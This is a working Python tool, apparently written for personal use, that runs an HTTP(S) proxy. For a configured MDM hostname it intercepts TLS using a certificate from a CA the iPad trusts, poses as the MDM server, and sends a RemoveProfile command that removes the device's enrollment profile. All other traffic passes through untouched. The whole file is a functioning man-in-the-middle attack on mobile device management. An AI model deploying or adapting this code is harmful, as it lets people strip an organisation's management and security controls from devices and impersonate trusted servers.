#!/usr/bin/env python3
# HTTP(S) proxy that MITMs the MDM hostname and passes everything else through.
# serves on 0.0.0.0:8080. iPad wifi profile points here.
# for CONNECT <mdm host>:443 we present our leaf cert (CA trusted on ipad),
# then speak the fake MDM protocol to send RemoveProfile.

import socket, ssl, threading, select, plistlib, uuid

# ---- config ------------------------------------------------------------------

MDM_HOST = "mdm.example.org"                      # the real MDM's hostname
PROFILE_ID = "com.vendor.mdm.enrollment.profile"  # PayloadIdentifier of the enrollment profile
CERT_PATH = "./certs/mdm.crt"                     # leaf cert for MDM_HOST, signed by your CA
KEY_PATH = "./certs/mdm.key"
BIND = ("0.0.0.0", 8080)

# ---- state -------------------------------------------------------------------

CMD_UUID = str(uuid.uuid4()).upper()
STATE = {"sent": False, "acked": False}

CTX = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
CTX.load_cert_chain(CERT_PATH, KEY_PATH)
CTX.verify_mode = ssl.CERT_NONE


def log(*a):
    print(*a, flush=True)


def handle_mdm_tls(sock, peer):
    """speak MDM protocol over an already-TLS-wrapped socket."""
    try:
        buf = b""
        while b"\r\n\r\n" not in buf:
            c = sock.recv(4096)
            if not c:
                return
            buf += c
        header, _, rest = buf.partition(b"\r\n\r\n")
        lines = header.split(b"\r\n")
        req_line = lines[0].decode(errors="replace")
        hdrs = {}
        for ln in lines[1:]:
            k, _, v = ln.decode(errors="replace").partition(":")
            hdrs[k.strip().lower()] = v.strip()
        clen = int(hdrs.get("content-length", "0"))
        body = rest
        while len(body) < clen:
            c = sock.recv(min(65536, clen - len(body)))
            if not c:
                break
            body += c
        ct = hdrs.get("content-type", "")
        log(f"[{peer}] MDM: {req_line}  CT={ct}  body={len(body)}")

        # only act on real MDM traffic: PUT/POST with plist body.
        # Safari / captive-portal / etc. will sometimes GET this host; 404 them.
        if not (req_line.startswith("PUT ") or req_line.startswith("POST ")):
            log(f"[{peer}]   not PUT/POST, 404")
            sock.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
            return

        p = None
        try:
            p = plistlib.loads(body)
        except Exception:
            # device sometimes sends binary plist with a preamble; find marker
            i = body.find(b"<?xml")
            if i < 0:
                i = body.find(b"bplist")
            if i >= 0:
                try:
                    p = plistlib.loads(body[i:])
                except Exception:
                    pass
        if p:
            log(f"[{peer}]   plist keys={list(p.keys())}  "
                f"MessageType={p.get('MessageType')}  Status={p.get('Status')}")

        is_checkin = (
            "checkin" in ct.lower()
            or (p and p.get("MessageType") in (
                "Authenticate", "TokenUpdate", "CheckOut",
                "GetBootstrapToken", "UserAuthenticate"))
        )

        if is_checkin:
            # ack any checkin message, including CheckOut (device confirming unenroll)
            log(f"[{peer}]   -> checkin ack")
            sock.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
            return

        status = (p or {}).get("Status", "")
        if status == "Acknowledged" and (p or {}).get("CommandUUID") == CMD_UUID:
            STATE["acked"] = True
            log(f"[{peer}]   >>> device ACKED RemoveProfile <<<")
            sock.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
            return
        if status == "Error" and (p or {}).get("CommandUUID") == CMD_UUID:
            log(f"[{peer}]   !!! device ERROR: {p.get('ErrorChain')}")
            sock.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
            return

        if STATE["sent"] and not STATE["acked"]:
            # device polling again before we got the ack — send empty, wait
            log(f"[{peer}]   waiting for ack, empty ok")
            sock.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
            return

        cmd = {
            "CommandUUID": CMD_UUID,
            "Command": {"RequestType": "RemoveProfile", "Identifier": PROFILE_ID},
        }
        plist_body = plistlib.dumps(cmd)
        STATE["sent"] = True
        log(f"[{peer}]   >>> sending RemoveProfile ({len(plist_body)}b "
            f"uuid={CMD_UUID}) <<<")
        resp = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/xml\r\n"
            b"Content-Length: " + str(len(plist_body)).encode() + b"\r\n\r\n"
            + plist_body
        )
        sock.sendall(resp)
    except Exception as e:
        log(f"[{peer}]   mdm err: {e}")


def splice(a, b):
    try:
        while True:
            r, _, _ = select.select([a, b], [], [], 60)
            if not r:
                break
            for s in r:
                data = s.recv(65536)
                if not data:
                    return
                (b if s is a else a).sendall(data)
    except Exception:
        pass


def handle_client(c, peer):
    try:
        c.settimeout(10)
        buf = b""
        while b"\r\n\r\n" not in buf:
            x = c.recv(4096)
            if not x:
                return
            buf += x
        header, _, rest = buf.partition(b"\r\n\r\n")
        first = header.split(b"\r\n", 1)[0].decode(errors="replace")
        log(f"[{peer}] REQ: {first}")
        if first.startswith("CONNECT "):
            target = first.split()[1]
            host, _, port = target.partition(":")
            port = int(port) if port else 443
            if host.lower() == MDM_HOST.lower():
                log(f"[{peer}]   MITM intercept for {host}:{port}")
                c.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")
                try:
                    tls = CTX.wrap_socket(c, server_side=True)
                    handle_mdm_tls(tls, peer)
                except Exception as e:
                    log(f"[{peer}]   TLS err: {e}")
                return
            # everything else: transparent tunnel
            log(f"[{peer}]   tunnel to {host}:{port}")
            try:
                up = socket.create_connection((host, port), timeout=10)
            except Exception as e:
                log(f"[{peer}]   upstream fail: {e}")
                c.sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
                return
            c.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")
            c.settimeout(None)
            up.settimeout(None)
            splice(c, up)
            up.close()
        else:
            # plain HTTP — ipad rarely does this through a proxy; not handled
            log(f"[{peer}]   non-CONNECT (plain HTTP) not handled")
            c.sendall(b"HTTP/1.1 501 Not Implemented\r\nContent-Length: 0\r\n\r\n")
    except Exception as e:
        log(f"[{peer}]   client err: {e}")
    finally:
        try:
            c.close()
        except Exception:
            pass


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(BIND)
    s.listen(32)
    log(f"HTTP proxy listening {BIND[0]}:{BIND[1]}")
    log(f"targeting MDM host: {MDM_HOST}")
    log(f"RemoveProfile CommandUUID: {CMD_UUID}")
    while True:
        c, a = s.accept()
        threading.Thread(target=handle_client, args=(c, a[0]), daemon=True).start()


if __name__ == "__main__":
    main()
